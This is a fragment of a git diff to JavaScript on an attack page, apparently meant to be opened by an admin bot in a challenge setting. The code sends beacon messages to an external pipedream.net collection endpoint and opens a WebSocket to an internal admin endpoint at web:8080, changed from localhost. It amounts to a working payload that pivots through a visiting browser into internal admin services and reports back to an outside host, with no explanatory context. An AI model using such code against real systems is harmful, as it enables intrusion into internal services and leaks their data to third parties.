@@ -12,7 +12,13 @@
             body: JSON.stringify({ message: "Bot accessed HTML page" })
         });
 
-        const ws = new WebSocket('ws://localhost:8080/admin/ws');
+        if (!window.WebSocket) fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: "socket not available" })
+        });
+
+        const ws = new WebSocket('ws://web:8080/admin/ws');
 
         fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
             method: 'POST',
